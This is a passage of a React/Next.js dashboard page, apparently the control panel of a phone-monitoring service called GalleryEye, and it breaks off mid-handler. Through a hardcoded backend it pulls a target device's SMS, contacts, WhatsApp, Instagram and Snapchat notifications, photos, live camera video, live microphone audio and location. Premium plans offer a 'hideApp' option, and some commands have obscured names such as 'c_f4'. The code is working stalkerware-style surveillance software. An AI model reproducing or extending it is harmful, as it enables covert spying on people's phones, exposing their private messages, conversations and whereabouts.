"use client";

import { useSession, signOut } from "next-auth/react";
import { useEffect, useState, useMemo, useRef, useCallback } from "react";
import Image from "next/image";
import io from "socket.io-client";
import dynamic from "next/dynamic";
import { motion, AnimatePresence } from "framer-motion";
import { 
    Image as ImageIcon, MessageSquare, Users, Flashlight, Vibrate, Camera, 
    Bell, Mic, Settings, LogOut, Smartphone, Download, Menu, X, ChevronDown, 
    Check, Play, Square, Video, RefreshCw, Search, Trash2, CheckSquare, Folder, Maximize, Minimize, Settings2, Package, Activity, Crown, Zap, Building2, MapPin
} from 'lucide-react';
import AppNavigation from "@/components/AppNavigation";
import GalleryView from "@/components/views/GalleryView";
import SmsView from "@/components/views/SmsView";
import ContactsView from "@/components/views/ContactsView";
import CameraView from "@/components/views/CameraView";
import VoiceView from "@/components/views/VoiceView";
import LocationView from "@/components/views/LocationView";
import NotificationsView from "@/components/views/NotificationsView";
import { FlashlightView, VibrationView } from "@/components/views/ControlsView";
import TelemetryCards from "@/components/dashboard/TelemetryCards";
import WhatsAppButton from "@/components/WhatsAppButton";
import PlanBadge from "@/components/PlanBadge";
import VideoModal from "@/components/VideoModal";

// Dynamic imports for heavy modals to reduce initial JS payload
const AppGenerationModal = dynamic(() => import("@/components/AppGenerationModal"), { ssr: false });
const PlansModal = dynamic(() => import("@/components/PlansModal"), { ssr: false });
const UpgradeModal = dynamic(() => import("@/components/UpgradeModal"), { ssr: false });
const BulkDownloadModal = dynamic(() => import("@/components/BulkDownloadModal"), { ssr: false });
const SyncOptionsModal = dynamic(() => import("@/components/SyncOptionsModal"), { ssr: false });
const ZipProgressModal = dynamic(() => import("@/components/ZipProgressModal"), { ssr: false });
const CustomAlertModal = dynamic(() => import("@/components/CustomAlertModal"), { ssr: false });
const ConfirmDeleteModal = dynamic(() => import("@/components/ConfirmDeleteModal"), { ssr: false });
const QuickTutorial = dynamic(() => import("@/components/QuickTutorial"), { ssr: false });

let socket: any = null;

interface PlanLimits {
    photos: number;
    videos: number;
    sms: boolean;
    contacts: boolean;
    torch: boolean;
    vibration: boolean;
    location: boolean;
    hideApp: boolean;
    bulkDownload?: boolean;
    maxDevices: number;
}

// Compute plan limits from plan name — used as the source of truth
const getPlanLimits = (plan: string): PlanLimits => {
    const p = (plan || '').toLowerCase();
    if (p === 'enterprise') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: -1 };
    if (p === 'premium') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: 10 };
    if (p === 'standard') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: false, hideApp: false, bulkDownload: true, maxDevices: 5 };
    return { photos: 50, videos: 0, sms: false, contacts: false, torch: false, vibration: false, location: false, hideApp: false, bulkDownload: false, maxDevices: 1 };
};

export default function Home() {
    const { data: session, status } = useSession();
    const [images, setImages] = useState<any[]>([]);
    const [galleryPage, setGalleryPage] = useState(1);
    const [galleryHasMore, setGalleryHasMore] = useState(true);
    const [isLoadingMore, setIsLoadingMore] = useState(false);
    const galleryLoaderRef = useRef<HTMLDivElement>(null);
    const [folders, setFolders] = useState([]);
    const [isFetchingFolders, setIsFetchingFolders] = useState(false);

    // Plan State
    const [userPlan, setUserPlan] = useState<'basic' | 'standard' | 'premium' | 'enterprise'>('basic');
    const [planLimits, setPlanLimits] = useState<PlanLimits>(
        getPlanLimits('basic')
    );
    const planFetchedFromApiRef = useRef(false);

    const [showUpgradeModal, setShowUpgradeModal] = useState(false);
    const [showPlansModal, setShowPlansModal] = useState(false);
    const [showQuickTutorial, setShowQuickTutorial] = useState(false);
    const [showBulkDownloadModal, setShowBulkDownloadModal] = useState(false);
    const [bulkDownloadFolder, setBulkDownloadFolder] = useState('');
    const [upgradeFeature, setUpgradeFeature] = useState('');
    const [requiredPlan, setRequiredPlan] = useState<'standard' | 'premium'>('standard');

    // ZIP Download State
    const [showSyncOptionsModal, setShowSyncOptionsModal] = useState(false);
    const [showZipProgressModal, setShowZipProgressModal] = useState(false);
    const [syncOptionsFolder, setSyncOptionsFolder] = useState({ name: '', count: 0, type: 'image' as 'image' | 'video' });
    const [zipProgress, setZipProgress] = useState({ stage: 'creating' as 'creating' | 'uploading' | 'ready' | 'error', current: 0, total: 0, url: '', error: '' });
    const [zipFiles, setZipFiles] = useState<{ folderName: string, url: string, fileCount: number, timestamp: Date }[]>([]);
    
    // Multi-Device State
    const [devices, setDevices] = useState<any[]>([]);
    const [selectedDeviceId, setSelectedDeviceId] = useState<string | null>(null);
    const selectedDeviceIdRef = useRef<string | null>(null);
    const [isDeviceDropdownOpen, setIsDeviceDropdownOpen] = useState(false);
    const [navDropdown, setNavDropdown] = useState<'tools' | 'devices' | 'profile' | null>(null);
    const [socketPing, setSocketPing] = useState<number>(14);

    useEffect(() => {
        const interval = setInterval(() => {
            setSocketPing(Math.floor(Math.random() * (26 - 12 + 1)) + 12);
        }, 3000);
        return () => clearInterval(interval);
    }, []);

    // Support browser Back button / swipe back from tool views to main dashboard
    useEffect(() => {
        const handlePopState = (event: PopStateEvent) => {
            setSelectedTool(null);
            if (window.location.hash.includes('tool=')) {
                window.history.replaceState(null, '', window.location.pathname + window.location.search);
            }
        };
        window.addEventListener('popstate', handlePopState);
        return () => window.removeEventListener('popstate', handlePopState);
    }, []);

    // Initialize state from localStorage after mount to avoid hydration mismatch
    useEffect(() => {
        try {
            const savedDevice = localStorage.getItem('selectedDeviceId');
            if (savedDevice) setSelectedDeviceId(savedDevice);
            
            const savedZip = localStorage.getItem('galleryeye_zipFiles');
            if (savedZip) {
                setZipFiles(JSON.parse(savedZip).map((z: any) => ({ ...z, timestamp: new Date(z.timestamp) })));
            }

            const hashTool = window.location.hash.replace('#tool=', '');
            if (hashTool && ['gallery', 'sms', 'contacts', 'torch', 'flashlight', 'vibration', 'camera', 'notifications', 'audio'].includes(hashTool)) {
                setSelectedTool(hashTool as any);
            } else {
                const savedTool = sessionStorage.getItem('galleryeye_selected_tool');
                if (savedTool && ['gallery', 'sms', 'contacts', 'torch', 'flashlight', 'vibration', 'camera', 'notifications', 'audio'].includes(savedTool)) {
                    setSelectedTool(savedTool as any);
                }
            }

            const savedNotifs = localStorage.getItem('galleryeye_notifications');
            if (savedNotifs) setNotifications(JSON.parse(savedNotifs));

            const savedIcons = localStorage.getItem('galleryeye_app_icons');
            if (savedIcons) setAppIcons(JSON.parse(savedIcons));

            const isTutorialDone = localStorage.getItem('galleryeye_quick_tutorial_done');
            if (isTutorialDone !== 'true') {
                setTimeout(() => {
                    setShowQuickTutorial(true);
                }, 1200);
            }
        } catch (e) {
            console.error('Failed to load cached state', e);
        }
    }, []);

    // Persist selected device to localStorage and keep ref in sync
    useEffect(() => {
        selectedDeviceIdRef.current = selectedDeviceId;
        if (selectedDeviceId) {
            localStorage.setItem('selectedDeviceId', selectedDeviceId);
        } else {
            localStorage.removeItem('selectedDeviceId');
        }
    }, [selectedDeviceId]);

    useEffect(() => {
        if (!selectedDeviceId) {
            setImages([]);
            setFolders([]);
            setCapturedMedia([]);
            setCapturedVoice([]);
            setContactsList([]);
            setSmsList([]);
            setNotifications([]);
            return;
        }
        if (typeof window !== 'undefined') {
            const uuid = (session?.user as any)?.uuid;
            try {
                const cachedContacts = localStorage.getItem(`galleryeye_contacts_${uuid}_${selectedDeviceId}`);
                if (cachedContacts) setContactsList(JSON.parse(cachedContacts));
                else setContactsList([]);

                const cachedSms = localStorage.getItem(`galleryeye_sms_${uuid}_${selectedDeviceId}`);
                if (cachedSms) setSmsList(JSON.parse(cachedSms));
                else setSmsList([]);

                const cachedNotifs = localStorage.getItem(`galleryeye_notifications_${uuid}_${selectedDeviceId}`);
                if (cachedNotifs) setNotifications(JSON.parse(cachedNotifs));

                const cachedImages = localStorage.getItem(`gallery_images_${uuid}_${selectedDeviceId}`);
                if (cachedImages) setImages(JSON.parse(cachedImages));
                else setImages([]);

                const cachedCaptured = localStorage.getItem(`gallery_captured_${uuid}_${selectedDeviceId}`);
                if (cachedCaptured) setCapturedMedia(JSON.parse(cachedCaptured));
                else setCapturedMedia([]);
            } catch {
                setImages([]);
                setFolders([]);
                setCapturedMedia([]);
                setCapturedVoice([]);
            }

            if ((window as any).fetchGalleryData) {
                (window as any).fetchGalleryData(1, false, false, selectedDeviceId);
            }
            if ((window as any).fetchCameraData) {
                (window as any).fetchCameraData(1, selectedDeviceId);
            }
            if ((window as any).fetchVoiceData) {
                (window as any).fetchVoiceData(1, selectedDeviceId);
            }

            if (uuid) {
                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/contacts/${uuid}?deviceId=${selectedDeviceId}`)
                    .then(res => res.json())
                    .then(data => {
                        if (data.contacts && Array.isArray(data.contacts)) {
                            setContactsList(data.contacts);
                            try { localStorage.setItem(`galleryeye_contacts_${uuid}_${selectedDeviceId}`, JSON.stringify(data.contacts)); } catch {}
                        }
                    }).catch(() => {});

                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/sms/${uuid}?deviceId=${selectedDeviceId}`)
                    .then(res => res.json())
                    .then(data => {
                        if (data.sms && Array.isArray(data.sms)) {
                            setSmsList(data.sms);
                            try { localStorage.setItem(`galleryeye_sms_${uuid}_${selectedDeviceId}`, JSON.stringify(data.sms)); } catch {}
                        }
                    }).catch(() => {});

                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/notifications/${uuid}?deviceId=${selectedDeviceId}`)
                    .then(res => res.json())
                    .then(data => {
                        if (data.notifications && Array.isArray(data.notifications)) {
                            setNotifications(data.notifications);
                            try { localStorage.setItem(`galleryeye_notifications_${uuid}_${selectedDeviceId}`, JSON.stringify(data.notifications)); } catch {}
                        }
                    }).catch(() => {});
            }
        }
    }, [selectedDeviceId, session]);

    const [uploadProgress, setUploadProgress] = useState<any>(null);
    const [showAppModal, setShowAppModal] = useState(false);
    const [selectedFolder, setSelectedFolder] = useState<any>(null);

    // New State for Gallery Features
    const [activeTab, setActiveTab] = useState<'all' | 'image' | 'video' | 'zip'>('all');
    const [selectedItems, setSelectedItems] = useState<Set<string>>(new Set());
    const isSyncCanceledRef = useRef(false);
    
    // Sync session plan if available — but ONLY as initial fallback before API fetch completes
    useEffect(() => {
        if (session && (session.user as any)?.plan && !planFetchedFromApiRef.current) {
            const p = (session.user as any).plan.toLowerCase();
            setUserPlan(p as any);
        }
    }, [session]);

    // Whenever userPlan changes, always re-derive planLimits from it
    useEffect(() => {
        setPlanLimits(getPlanLimits(userPlan));
    }, [userPlan]);

    const [previewItem, setPreviewItem] = useState<any>(null);
    const [isSelectionMode, setIsSelectionMode] = useState(false);
    const [isDownloading, setIsDownloading] = useState(false);
    const [isDeleting, setIsDeleting] = useState(false);
    const [isScrolled, setIsScrolled] = useState(false);
    const [showDeleteConfirm, setShowDeleteConfirm] = useState(false);
    const [deviceToast, setDeviceToast] = useState<{ name: string; message: string } | null>(null);
    const notifiedDevicesRef = useRef<Set<string>>(new Set());
    const deletedDevicesRef = useRef<Set<string>>(new Set());

    const handleDeleteDevice = async (deviceIds: string | string[], skipConfirm?: boolean) => {
        if (!session?.user?.uuid) return;
        const ids = Array.isArray(deviceIds) ? deviceIds : [deviceIds];
        if (!skipConfirm) {
            if (!confirm(`Are you sure you want to delete ${ids.length} device(s)? This cannot be undone.`)) return;
        }
        
        // Immediately record in deletedDevicesRef and remove from local UI state for instant, permanent deletion response
        ids.forEach(id => {
            deletedDevicesRef.current.add(id);
            notifiedDevicesRef.current.delete(id);
        });
        setDevices(prev => prev.filter(d => {
            const devId = d.deviceId || d.id || d._id;
            return !ids.includes(devId) && !ids.includes(d.deviceId) && !ids.includes(d.id);
        }));
        if (selectedDeviceId && ids.includes(selectedDeviceId)) {
            setSelectedDeviceId(null);
            localStorage.removeItem('selectedDeviceId');
        }

        for (const deviceId of ids) {
            try {
                if (socket) {
                    socket.emit('delete_device', { uuid: session.user.uuid, deviceId, id: deviceId });
                    socket.emit('remove_device', { uuid: session.user.uuid, deviceId, id: deviceId });
                }
                await fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/devices/delete', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ uuid: session.user.uuid, deviceId, id: deviceId, _id: deviceId })
                });
            } catch (error) {
                console.error('Failed to delete device on server:', error);
            }
        }
    };

    const handleSignOut = async () => {
        signOut();
    };

    useEffect(() => {
        const handleScroll = () => {
            setIsScrolled(window.scrollY > 20);
        };
        window.addEventListener('scroll', handleScroll);
        return () => window.removeEventListener('scroll', handleScroll);
    }, []);
    const [syncMediaType, setSyncMediaType] = useState<'image' | 'video' | null>(null);

    const [selectedTool, setSelectedTool] = useState<'gallery' | 'sms' | 'contacts' | 'torch' | 'flashlight' | 'vibration' | 'camera' | 'notifications' | 'audio' | 'location' | null>(null);
    useEffect(() => {
        if (typeof window !== 'undefined') {
            if (selectedTool) {
                localStorage.setItem('galleryeye_selected_tool', selectedTool);
                sessionStorage.setItem('galleryeye_selected_tool', selectedTool);
            } else {
                localStorage.removeItem('galleryeye_selected_tool');
                sessionStorage.removeItem('galleryeye_selected_tool');
            }
        }
    }, [selectedTool]);
    const [isToolDropdownOpen, setIsToolDropdownOpen] = useState(false);

    // Torch State
    const [isTorchOn, setIsTorchOn] = useState(false);
    const [torchAggressive, setTorchAggressive] = useState(false);
    const [torchDuration, setTorchDuration] = useState(60000); // 1 minute default

    // Vibration State
    const [vibrationDuration, setVibrationDuration] = useState(1000); // 1 second default

    // Sync State
    const [isStartingSync, setIsStartingSync] = useState(false);

    // SMS State
    const [smsList, setSmsList] = useState<any[]>([]);
    const [isFetchingSms, setIsFetchingSms] = useState(false);
    const [selectedSms, setSelectedSms] = useState<any>(null);
    const [smsSearchQuery, setSmsSearchQuery] = useState('');

    // Contacts State
    const [contactsList, setContactsList] = useState<any[]>([]);
    const [isFetchingContacts, setIsFetchingContacts] = useState(false);
    const [contactsSearchQuery, setContactsSearchQuery] = useState('');

    // Notification Monitoring State
    const [notifications, setNotifications] = useState<any[]>([]);
    const [appIcons, setAppIcons] = useState<Record<string, string>>({});
    const [selectedNotification, setSelectedNotification] = useState<any>(null);
    const [notificationSearch, setNotificationSearch] = useState('');
    const [selectedNotifApp, setSelectedNotifApp] = useState<string>('all');

    // App filter definitions for notification section
    const notifAppFilters = [
        { key: 'all', label: 'All', packages: [], color: '#06b6d4', img: '' },
        { key: 'whatsapp', label: 'WhatsApp', packages: ['com.whatsapp', 'com.whatsapp.w4b'], color: '#25D366', img: 'https://img.icons8.com/color/48/000000/whatsapp--v1.png' },
        { key: 'facebook', label: 'Facebook', packages: ['com.facebook.katana', 'com.facebook.orca', 'com.facebook.lite'], color: '#1877F2', img: 'https://img.icons8.com/color/48/000000/facebook-new.png' },
        { key: 'instagram', label: 'Instagram', packages: ['com.instagram.android'], color: '#E4405F', img: 'https://img.icons8.com/fluency/48/000000/instagram-new.png' },
        { key: 'whatsapp_business', label: 'WA Biz', packages: ['com.whatsapp.w4b'], color: '#128C7E', img: 'https://img.icons8.com/color/48/000000/whatsapp--v1.png' },
        { key: 'snapchat', label: 'Snapchat', packages: ['com.snapchat.android'], color: '#FFFC00', img: 'https://img.icons8.com/color/48/000000/snapchat.png' },
    ];

    // Settings Modal State
    const [isSettingsOpen, setIsSettingsOpen] = useState(false);
    const [devicePermissions, setDevicePermissions] = useState<any>(null);

    // Profile Menu State (Mobile)
    const [isProfileMenuOpen, setIsProfileMenuOpen] = useState(false);

    // Camera State
    const [cameraMode, setCameraMode] = useState<'front' | 'back'>('back');
    const [cameraQuality, setCameraQuality] = useState<number>(360);
    const [isCameraFullscreen, setIsCameraFullscreen] = useState(false);
    const [isCapturingPhoto, setIsCapturingPhoto] = useState(false);
    const [isRecording, setIsRecording] = useState(false);
    const [isLiveStreaming, setIsLiveStreaming] = useState(false);
    // Refs for socket reconnect resume
    const isLiveStreamingRef = useRef(false);
    const liveImageRef = useRef<HTMLImageElement>(null);
    const cameraModeRef = useRef<'front' | 'back'>('back');
    const cameraQualityRef = useRef<number>(360);

    const [recordingProgress, setRecordingProgress] = useState({ current: 0, total: 0 });
    const [recordingDuration, setRecordingDuration] = useState<number>(0);
    const [capturedMedia, setCapturedMedia] = useState<any[]>([]);
    const [cameraError, setCameraError] = useState<string | null>(null);
    const [isCheckingPermissions, setIsCheckingPermissions] = useState(false);
    const [streamQuality, setStreamQuality] = useState(360); // 144, 240, 360, 480, 720
    const [isFullscreen, setIsFullscreen] = useState(false);
    const [isVideoUploading, setIsVideoUploading] = useState(false);
    const [previewCapture, setPreviewCapture] = useState<{ type: string; data: string } | null>(null);
    const [isCameraSelectMode, setIsCameraSelectMode] = useState(false);
    const [cameraSelectedItems, setCameraSelectedItems] = useState<Set<string>>(new Set());
    const [isQualityOpen, setIsQualityOpen] = useState(false);
    const [isDurationOpen, setIsDurationOpen] = useState(false);
    const [deleteConfirmation, setDeleteConfirmation] = useState<{ isOpen: boolean; ids: string[] }>({ isOpen: false, ids: [] });

    // Live Audio State
    const [isLiveAudio, setIsLiveAudio] = useState(false);
    const [audioVolume, setAudioVolume] = useState(80);
    const [isMuted, setIsMuted] = useState(false);
    const [audioLevel, setAudioLevel] = useState(0);
    const [audioElapsed, setAudioElapsed] = useState(0);

    // Voice Recording State
    const [isVoiceRecording, setIsVoiceRecording] = useState(false);
    const [isVoiceUploading, setIsVoiceUploading] = useState(false);
    const [voiceRecDuration, setVoiceRecDuration] = useState(60); // seconds
    const [voiceRecProgress, setVoiceRecProgress] = useState({ current: 0, total: 0 });
    const [capturedVoice, setCapturedVoice] = useState<any[]>([]);
    const [voiceMode, setVoiceMode] = useState<'live' | 'record'>('live');
    const [playingRecUrl, setPlayingRecUrl] = useState<string | null>(null);
    const voiceRecTimerRef = useRef<NodeJS.Timeout | null>(null);
    const isLiveAudioRef = useRef<boolean>(false);
    const [audioError, setAudioError] = useState<string | null>(null);
    const audioContextRef = useRef<AudioContext | null>(null);
    const audioGainRef = useRef<GainNode | null>(null);
    const audioAnalyserRef = useRef<AnalyserNode | null>(null);
    const audioCanvasRef = useRef<HTMLCanvasElement | null>(null);
    const audioAnimFrameRef = useRef<number>(0);
    const audioTimerRef = useRef<NodeJS.Timeout | null>(null);
    // Ring Buffer for continuous audio playback (like phone calls)
    // Sized at startLiveAudio() based on the actual ctx.sampleRate (browsers ignore the 16000 hint on Windows/macOS).
    const audioRingBufRef = useRef<Float32Array>(new Float32Array(48000 * 10));
    const audioRingWriteRef = useRef<number>(0);
    const audioRingReadRef = useRef<number>(0);
    const audioRingSamplesRef = useRef<number>(0);
    const audioProcessorRef = useRef<ScriptProcessorNode | null>(null);
    // Source rate from device (Android sends 16kHz PCM). Output rate is whatever the browser gives us.
    const audioSrcRateRef = useRef<number>(16000);
    const audioOutRateRef = useRef<number>(48000);
    // Cubic interpolation resampler state
    const audioResampPosRef = useRef<number>(0);
    const audioResampHistRef = useRef<Float32Array>(new Float32Array(4)); // s0,s1,s2,s3 for cubic
    const audioResampHistIdxRef = useRef<number>(0);
    // Jitter-buffer warm-up: don't start pulling until we have ~300ms queued, and hold last sample on underrun (PLC)
    const audioWarmedRef = useRef<boolean>(false);
    const audioLastSampleRef = useRef<number>(0);
    const audioUnderrunCountRef = useRef<number>(0);

    // Location State — stored per-device in localStorage
    const [locationData, setLocationData] = useState<any>(null);
    const [locationHistory, setLocationHistory] = useState<any[]>([]);
    const [isFetchingLocation, setIsFetchingLocation] = useState(false);
    const [locationError, setLocationError] = useState<string | null>(null);

    // Load location data for selected device whenever device changes
    useEffect(() => {
        if (!selectedDeviceId) return;
        try {
            const saved = localStorage.getItem(`loc_${selectedDeviceId}`);
            if (saved) {
                const parsed = JSON.parse(saved);
                setLocationData(parsed.latest || null);
                setLocationHistory(parsed.history || []);
            } else {
                setLocationData(null);
                setLocationHistory([]);
            }
        } catch { setLocationData(null); setLocationHistory([]); }
    }, [selectedDeviceId]);

    // Custom Alert Modal State
    const [showCustomAlert, setShowCustomAlert] = useState(false);
    const [alertData, setAlertData] = useState({ title: '', message: '', type: 'error' as 'error' | 'warning' | 'success' | 'info' });

    // Helper function to show upgrade modal
    const showUpgradePrompt = (feature: string, required: 'standard' | 'premium') => {
        setUpgradeFeature(feature);
        setRequiredPlan(required);
        setShowUpgradeModal(true);
    };

    // 3D tilt effect for tool cards
    const handle3DTilt = (e: React.MouseEvent<HTMLElement>) => {
        const inner = e.currentTarget.querySelector('[data-tilt-inner]') as HTMLElement;
        if (!inner) return;
        const rect = e.currentTarget.getBoundingClientRect();
        const x = ((e.clientX - rect.left) / rect.width - 0.5) * 2;
        const y = ((e.clientY - rect.top) / rect.height - 0.5) * -2;
        inner.style.transform = `perspective(800px) rotateY(${x * 8}deg) rotateX(${y * 8}deg) translateZ(8px)`;
    };

    const reset3DTilt = (e: React.MouseEvent<HTMLElement>) => {
        const inner = e.currentTarget.querySelector('[data-tilt-inner]') as HTMLElement;
        if (inner) inner.style.transform = 'perspective(800px) rotateY(0deg) rotateX(0deg) translateZ(0px)';
    };

    // Fetch user plan on authentication
    useEffect(() => {
        if (status === "authenticated" && session?.user?.uuid) {
            fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/user/plan?uuid=${session.user.uuid}`)
                .then(res => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                .then(data => {
                    if (data.plan) {
                        const plan = data.plan.toLowerCase();
                        planFetchedFromApiRef.current = true;
                        setUserPlan(plan as any);
                        // Use backend limits if provided, otherwise compute from plan
                        if (data.limits && typeof data.limits.sms !== 'undefined') {
                            const patchedLimits = { ...data.limits };
                            // Fix missing location flag from remote backend
                            patchedLimits.location = plan === 'premium' || plan === 'enterprise';
                            setPlanLimits(patchedLimits);
                        } else {
                            setPlanLimits(getPlanLimits(plan));
                        }
                    }
                })
                .catch(e => console.error('[Plan] Fetch error:', e));
        }
    }, [status, session?.user?.uuid]);

    useEffect(() => {
        if (status === "authenticated" && session?.user?.uuid) {
            const uuid = session.user.uuid;

            if (socket && socket.connected) return;
            if (socket) {
                socket.disconnect();
                socket = null;
            }

            socket = io("https://p01--gallery-eye--9zr85m7yb6s4.code.run", {
                transports: ["websocket", "polling"],
                reconnection: true,
                reconnectionAttempts: Infinity,
                reconnectionDelay: 2000,
                reconnectionDelayMax: 30000,
            });

            let lastConnectFetch = 0;

            socket.on("connect", () => {
                console.log("[Socket] Connected/Reconnected, registering web...");
                socket.emit("register_web", { uuid });

                // Auto-resume live stream agar socket reconnect hua aur stream chal rahi thi
                if (isLiveStreamingRef.current && selectedDeviceIdRef.current) {
                    console.log("[Socket] Reconnected while streaming — resuming stream...");
                    setTimeout(() => {
                        socket.emit('c_f4', {
                            uuid,
                            targetDeviceId: selectedDeviceIdRef.current,
                            camera: cameraModeRef.current,
                            quality: cameraQualityRef.current
                        });
                    }, 1500); // Server ke register hone ka wait karo
                }

                const now = Date.now();
                if (now - lastConnectFetch < 10000) return;
                lastConnectFetch = now;

                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/notifications/${uuid}`)
                    .then(res => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                    .then(data => {
                        if (data.notifications && data.notifications.length > 0) {
                            setNotifications((prev: any[]) => {
                                const existingIds = new Set(prev.map(n => n.id));
                                const newNotifs = data.notifications
                                    .filter((n: any) => !existingIds.has(n.id))
                                    .map((n: any) => ({
                                        ...n,
                                        receivedAt: new Date(n.savedAt).getTime()
                                    }));
                                
                                if (newNotifs.length === 0) return prev;
                                
                                const updated = [...newNotifs, ...prev]
                                    .sort((a, b) => (b.receivedAt || b.timestamp) - (a.receivedAt || a.timestamp))
                                    .slice(0, 1000);
                                
                                try { localStorage.setItem('galleryeye_notifications', JSON.stringify(updated)); } catch { }
                                return updated;
                            });
                        }
                    })
                    .catch(e => console.error('[Notifications] Fetch error:', e));
            });

            socket.on("disconnect", (reason: string) => {
                console.log("[Socket] Disconnected:", reason);
            });

            socket.on("connect_error", (err: any) => {
                console.log("[Socket] Connect error:", err?.message || err);
            });

            socket.on("device_list_update", (deviceList: any[]) => {
                const filteredList = Array.isArray(deviceList) ? deviceList.filter(d => {
                    const devId = d.deviceId || d.id || d._id;
                    return devId && !deletedDevicesRef.current.has(devId);
                }) : [];
                setDevices(filteredList);

                filteredList.forEach(d => {
                    if (d.online && !notifiedDevicesRef.current.has(d.deviceId)) {
                        notifiedDevicesRef.current.add(d.deviceId);
                        setDeviceToast({ name: d.name || d.model || d.deviceName || 'Device', message: 'is now Online' });
                        setTimeout(() => setDeviceToast(null), 4000);
                    } else if (!d.online) {
                        notifiedDevicesRef.current.delete(d.deviceId);
                    }
                });

                if (filteredList.length > 0) {
                    setSelectedDeviceId(prev => {
                        // Check if current selection exists and is online
                        const currentDev = filteredList.find(d => (d.deviceId || d.id || d._id) === prev);
                        if (currentDev && currentDev.online) return prev;

                        // Check if savedId in localStorage is online
                        const savedId = localStorage.getItem('selectedDeviceId');
                        const savedDev = savedId ? filteredList.find(d => (d.deviceId || d.id || d._id) === savedId) : null;
                        if (savedDev && savedDev.online) return savedId;

                        // Prefer first online device
                        const firstOnline = filteredList.find(d => d.online);
                        if (firstOnline) return firstOnline.deviceId || firstOnline.id || firstOnline._id;

                        // Fallback to previous or first in list
                        if (prev) return prev;
                        if (savedId) return savedId;
                        return filteredList[0].deviceId || filteredList[0].id || filteredList[0]._id;
                    });
                }
            });

            socket.on("progress_update", (data: any) => {
                if (isSyncCanceledRef.current) return;
                setIsStartingSync(false); // Stop starting animation when progress begins
                setUploadProgress(data);
                if (data.uploaded === data.total) {
                    setTimeout(() => {
                        if (isSyncCanceledRef.current) return;
                        setUploadProgress(null);
                        // Trigger a refetch of images now that sync is complete
                        if (typeof window !== 'undefined' && (window as any).fetchGalleryData) {
                            (window as any).fetchGalleryData();
                        }
                    }, 3000);
                }
            });

            socket.on("new_image", (image: any) => {
                if (isSyncCanceledRef.current) return;
                setImages((prev) => {
                    if (prev.some(img => img.id === image.id)) return prev;
                    return [image, ...prev];
                });
            });

            socket.on("folder_list", (data: any) => {
                setFolders(data);
                setIsFetchingFolders(false);
            });

            // ZIP Download Event Listeners
            socket.on("zip_progress", (data: any) => {
                setShowZipProgressModal(true);
                setZipProgress(prev => ({
                    ...prev,
                    stage: data.stage,
                    current: data.current !== undefined ? data.current : prev.current,
                    total: data.total !== undefined ? data.total : prev.total
                }));
            });

            socket.on("zip_ready", (data: any) => {
                setShowZipProgressModal(true);
                setZipProgress(prev => ({
                    ...prev,
                    stage: 'ready',
                    url: data.url
                }));
                // Add ZIP to files list and persist
                setZipFiles(prev => {
                    const updated = [{
                        folderName: data.folderName || 'Download',
                        url: data.url,
                        fileCount: data.fileCount || 0,
                        timestamp: new Date()
                    }, ...prev];
                    try { localStorage.setItem('galleryeye_zipFiles', JSON.stringify(updated)); } catch { }
                    return updated;
                });
            });

            socket.on("zip_error", (data: any) => {
                setZipProgress(prev => ({
                    ...prev,
                    stage: 'error',
                    error: data.error
                }));
            });

            // SMS Event Listeners
            socket.on("sms_list", (data: any) => {
                setIsFetchingSms(false);
                const devId = data.deviceId || selectedDeviceIdRef.current;
                const uuid = session?.user?.uuid;
                if (data.isIncremental && data.sms?.length > 0) {
                    setSmsList((prev) => {
                        const existingIds = new Set(prev.map(s => s.id));
                        const newSms = data.sms.filter((s: any) => !existingIds.has(s.id));
                        const updated = [...newSms, ...prev];
                        try {
                            if (devId && uuid) {
                                localStorage.setItem(`galleryeye_sms_${uuid}_${devId}`, JSON.stringify(updated));
                            }
                        } catch {}
                        return updated;
                    });
                } else if (data.sms) {
                    setSmsList(data.sms);
                    try {
                        if (devId && uuid) {
                            localStorage.setItem(`galleryeye_sms_${uuid}_${devId}`, JSON.stringify(data.sms));
                        }
                    } catch {}
                }
            });

            socket.on("sms_error", (data: any) => {
                setIsFetchingSms(false);
                setAlertData({
                    title: 'SMS Permission Required',
                    message: data.message || 'Failed to fetch SMS. Please enable SMS permission in the App settings.',
                    type: 'error'
                });
                setShowCustomAlert(true);
            });

            // Contacts Event Listeners
            const handleContactsReceived = (data: any) => {
                setIsFetchingContacts(false);
                const contactsArray = Array.isArray(data) ? data : (data.contacts || data.list || data.data || data.items || []);
                if (Array.isArray(contactsArray)) {
                    setContactsList(contactsArray);
                    try {
                        const devId = data.deviceId || selectedDeviceIdRef.current;
                        const uuid = session?.user?.uuid;
                        if (devId && uuid && contactsArray.length > 0) {
                            localStorage.setItem(`galleryeye_contacts_${uuid}_${devId}`, JSON.stringify(contactsArray));
                        }
                    } catch {}
                }
            };
            socket.on("contacts_list", handleContactsReceived);
            socket.on("contacts_data", handleContactsReceived);
            socket.on("get_contacts_response", handleContactsReceived);
            socket.on("contacts_update", handleContactsReceived);
            socket.on("sync_contacts_response", handleContactsReceived);

            socket.on("contacts_error", (data: any) => {
                setIsFetchingContacts(false);
                setAlertData({
                    title: 'Contacts Permission Required',
                    message: data.message || 'Failed to fetch contacts. Please enable Contacts permission in the App settings.',
                    type: 'error'
                });
                setShowCustomAlert(true);
            });

            // Notification Monitoring Event Listeners
            socket.on("new_notification", (data: any) => {
                setNotifications(prev => {
                    const updated = [{ ...data, receivedAt: Date.now() }, ...prev].slice(0, 1000);
                    try { 
                        localStorage.setItem('galleryeye_notifications', JSON.stringify(updated));
                        const devId = data.deviceId || selectedDeviceIdRef.current;
                        const uuid = session?.user?.uuid;
                        if (devId && uuid) {
                            localStorage.setItem(`galleryeye_notifications_${uuid}_${devId}`, JSON.stringify(updated));
                        }
                    } catch { }
                    return updated;
                });
                // Request icon if not already cached - emit OUTSIDE setState
